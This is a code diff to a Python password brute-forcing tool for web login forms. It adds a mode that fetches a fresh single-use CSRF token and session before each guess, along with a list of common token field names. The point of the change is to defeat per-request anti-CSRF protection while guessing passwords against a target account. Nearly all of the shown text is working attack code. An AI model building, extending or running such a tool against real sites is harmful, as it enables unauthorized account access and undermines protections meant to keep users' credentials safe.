@@ -96,6 +96,10 @@ def extract_csrf(html, field_names):
     return None
 
 
+CSRF_FIELDS = ["csrf", "csrf_token", "csrfmiddlewaretoken", "_token",
+               "token", "authenticity_token"]
+
+
 class Brute(object):
     def __init__(self, args):
         self.args = args
@@ -136,6 +140,24 @@ class Brute(object):
                                 "HTTP %d, %d bytes" % (status, length)))
             return ("miss", (password, status, length))
 
+        # ---- CSRF mode: fetch a FRESH single-use token per attempt ----
+        if a.csrf_fresh:
+            try:
+                html, _ = fetch_login_page(opener, a.login_page, a.timeout)
+            except Exception as e:
+                return ("error", "login page fetch failed: %s" % e)
+            got = extract_csrf(html, a.csrf_field or CSRF_FIELDS)
+            if not got:
+                return ("error", "no CSRF token found in login page")
+            cname, cval = got
+            data = {a.user_field: a.username, a.pass_field: password, cname: cval}
+            for kv in (a.extra or []):
+                if "=" in kv:
+                    k, v = kv.split("=", 1)
+                    data[k] = v
+            return self._submit(opener, data, password)
+
+        # ---- normal form mode (static token / no token) ----
         data = {a.user_field: a.username, a.pass_field: password}
         if self.csrf_name and self.csrf_value is not None:
             data[self.csrf_name] = self.csrf_value
@@ -143,6 +165,10 @@ class Brute(object):
             if "=" in kv:
                 k, v = kv.split("=", 1)
                 data[k] = v
+        return self._submit(opener, data, password)
+
+    def _submit(self, opener, data, password):
+        a = self.args
         payload = urllib.parse.urlencode(data).encode()
         req = urllib.request.Request(
             a.url, data=payload, method="POST",
@@ -200,11 +226,12 @@ class Brute(object):
         a = self.args
         if a.basic_auth:
             log("[*] HTTP Basic Auth mode: GET %s with Authorization header" % a.url)
+        elif a.csrf_fresh:
+            log("[*] CSRF-fresh mode: new session + fresh token for EVERY attempt")
         else:
             try:
                 html, _ = fetch_login_page(build_opener(a.insecure), a.login_page, a.timeout)
-                fields = a.csrf_field or ["csrf", "csrf_token", "csrfmiddlewaretoken",
-                                          "_token", "token", "authenticity_token"]
+                fields = a.csrf_field or CSRF_FIELDS
                 got = extract_csrf(html, fields)
                 if got:
                     self.csrf_name, self.csrf_value = got
@@ -250,6 +277,9 @@ def parse_args(argv):
                    help="substring present ONLY on success (hydra S=)")
     p.add_argument("--csrf-field", action="append", default=None,
                    help="hidden token field name(s) to look for")
+    p.add_argument("--csrf-fresh", action="store_true",
+                   help="fetch a FRESH single-use CSRF token + new session for "
+                        "EVERY attempt (needed for single-use session-bound tokens)")
     p.add_argument("--extra", action="append", default=None,
                    help="extra fixed form fields, key=value (repeatable)")
     p.add_argument("--basic-auth", action="store_true",
